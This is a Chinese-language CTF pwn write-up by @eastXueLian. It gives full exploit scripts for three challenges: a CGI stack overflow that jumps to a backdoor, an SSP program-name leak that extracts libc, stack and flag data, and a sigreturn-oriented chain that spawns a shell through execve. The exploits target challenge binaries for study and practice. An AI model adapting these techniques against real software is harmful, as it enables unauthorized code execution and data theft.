
## APACHE-CGI-PWN

有后门和巨大的栈溢出，不过调试比较麻烦，在 docker 上用 gdbserver 调一下就清楚具体偏移量了：

```sh
#!/bin/bash

export REQUEST_METHOD="POST"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export CONTENT_LENGTH="236"

echo -n "cmd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | gdbserver localhost:6666 ./check-ok.cgi
```

最终得到利用代码：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()

io: tube = gift.io


def get_invited():
    request = f"GET /getcookie.cgi HTTP/1.1\r\n"
    request += f"Host: 127.0.0.1\r\n"
    request += f"Cookie: ROOT-GOD=Every king's blood will end with a sword"
    # request += f"a" * 0x200
    request += f"\r\n"
    request += f"\r\n"
    request += f"\r\n"
    s(request)
    exit()


# get_invited()

payload = b"a" * 0xE4
# payload += p64(0x401EBC)
payload += p64(0x4032EE)

request = b"POST /check-ok.cgi HTTP/1.1\r\n"
request += b"Host: 127.0.0.1\r\n"
request += b"Content-Type: application/x-www-form-urlencoded\r\n"
request += b"Content-Length: " + i2b(len(payload) + 4)
request += b"\r\n"
request += b"\r\n"
request += b"cmd="
request += payload
request += b"\r\n"
request += b"\r\n"

s(request)


ia()
```

访问 /flag 得到最终 flag.

---

## eazy_ssp

fork 了三个子进程，执行同样的内容，其中有巨大的 gets 栈溢出，想到经典覆写程序名来泄露敏感信息的情况，前两次泄露栈地址，最后一次泄露 flag 即可；

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.23.so")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)

ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(0x602018)
sl(payload)
ru(b"*** stack smashing detected ***: ")
leak = ru(b" terminated", drop=True)
libc_base = u64_ex(leak[:6]) - 0x6F6A0
lg("libc_base", libc_base)

ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)
ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(libc_base + 0x3C6F38)
sl(payload)
ru(b"*** stack smashing detected ***: ")
leak = ru(b" terminated", drop=True)
stack_base = u64_ex(leak[:6])
lg("stack_base", stack_base)


ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)
ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(stack_base - 0x178)
sl(payload)
ru(b"*** stack smashing detected ***: ")
# leak = ru(b" terminated", drop=True)
# stack_base = u64_ex(leak[:6])
# lg("stack_base", stack_base)

flag = ru(b" terminated", drop=True)

print(flag)

final = ""
for i in range(len(flag)):
    print(chr(flag[i] ^ key), end="")

print()

ia()
```

---

## master-of-asm

程序代码很简单，巨大溢出，一眼 sigreturn，直接套模板就行：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

syscall = 0x0000000000401019
ret = 0x000000000040102F
set0_rax = 0x40103D
shl_rax = 0x401030
xor_rax1 = 0x401034
start_addr = 0x401000

# rax=readcnt

ru(b"Hello Pwn")
payload = p64(start_addr) * 3
s(payload)

ru(b"Hello Pwn")
payload = flat(
    [
        set0_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        syscall,
    ]
)
sigframe = SigreturnFrame()
sigframe.rax = 0x3B
sigframe.rdi = 0x40200A
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x402030
sigframe.rip = syscall
payload += bytes(sigframe)
s(payload)

ia()
```
